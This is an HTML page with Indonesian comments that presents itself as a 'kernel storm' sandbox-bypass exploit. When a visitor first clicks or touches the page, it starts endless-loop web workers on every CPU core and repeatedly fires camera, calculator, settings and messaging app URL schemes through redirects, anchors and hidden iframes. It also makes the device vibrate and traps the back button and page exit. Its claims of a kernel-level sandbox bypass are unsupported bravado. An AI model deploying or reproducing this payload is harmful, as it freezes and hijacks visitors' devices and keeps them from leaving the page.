<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ KERNEL_STORM_V16_MULTI ⚡</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; color: #ff3b30; overflow: hidden; font-family: -apple-system, sans-serif; }
        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .breach-box { width: 85%; padding: 25px; border-radius: 18px; background: rgba(20, 20, 20, 0.95); border: 2px solid #ff3b30; text-align: center; }
        .status-pulse { font-size: 16px; font-weight: bold; text-transform: uppercase; animation: pulse 0.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        #log { font-size: 9px; color: #666; margin-top: 20px; height: 100px; overflow: hidden; text-align: left; font-family: monospace; }
    </style>
</head>
<body>
    <div id="stage">
        <div class="breach-box">
            <div class="status-pulse">SYSTEM_INTRUSION_V16</div>
            <div id="current-action" style="color:#fff; font-size: 12px; margin-top:10px;">READY_TO_BYPASS_SANDBOX</div>
            <div id="log"></div>
        </div>
    </div>

<script>
    const logBox = document.getElementById('log');
    const actionText = document.getElementById('current-action');

    function print(m) {
        const d = document.createElement('div');
        d.innerText = `[!] ${m}`;
        logBox.prepend(d);
    }

    // --- 1. TARGET APP VECTORS ---
    // Menambahkan target Kamera, Kalkulator, dan System Settings
    const targetApps = [
        // CAMERA VECTORS
        "facetime-video://", 
        "cameraui://", 
        "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;end",
        // CALCULATOR VECTORS
        "calc://", 
        "calculator://",
        "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_CALCULATOR;launchFlags=0x14008000;end",
        // OTHER SYSTEM VECTORS
        "music://",
        "prefs:root=General", // iOS Settings
        "message://"
    ];

    // --- 2. THE MULTI-INJECTION ENGINE ---
    function injectSchemes() {
        targetApps.forEach((uri, i) => {
            setTimeout(() => {
                print(`Triggering_Vector: ${uri.split(':')[0]}`);
                
                // Method 1: Location Replace (Agresif)
                window.location.replace(uri);

                // Method 2: Dynamic Anchor Injection
                const a = document.createElement('a');
                a.href = uri;
                a.rel = "noreferrer";
                a.click();

                // Method 3: Iframe Stealth
                const ifr = document.createElement('iframe');
                ifr.src = uri;
                ifr.style.display = 'none';
                document.body.appendChild(ifr);
                
                // Cleanup untuk menjaga performa DOM
                setTimeout(() => ifr.remove(), 500);
            }, i * 25); // Interval sangat rapat untuk memicu Race Condition
        });
    }

    // --- 3. KERNEL THREAD EXHAUSTION (BYPASS REINFORCEMENT) ---
    function blastCPU() {
        print("Launching_Thread_Exhaustion...");
        // Menggunakan SharedArrayBuffer untuk mengunci CPU agar Sandbox terlambat memvalidasi perintah
        const blob = new Blob(["while(true){Math.atan2(Math.random(), Math.random())}"], {type: 'text/javascript'});
        const u = URL.createObjectURL(blob);
        for(let j=0; j < (navigator.hardwareConcurrency || 4); j++) {
            new Worker(u);
        }
    }

    async function startFullAttack() {
        actionText.innerText = "STATUS: EXPLOITING_CHAIN...";
        actionText.style.color = "#ff3b30";

        // Step A: Lumpuhkan UI Thread
        blastCPU();

        // Step B: Mulai Storming
        setInterval(() => {
            injectSchemes();
            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
        }, 500);

        print("BREACH_STAGING_COMPLETE");
    }

    // TRIGGER
    window.addEventListener('click', startFullAttack, {once: true});
    window.addEventListener('touchstart', startFullAttack, {once: true});

    // Anti-Exit
    window.onbeforeunload = () => { return "KERNEL_LOCK_ACTIVE"; };
    history.pushState(null, null, location.href);
    window.onpopstate = () => history.go(1);

</script>
</body>
</html>
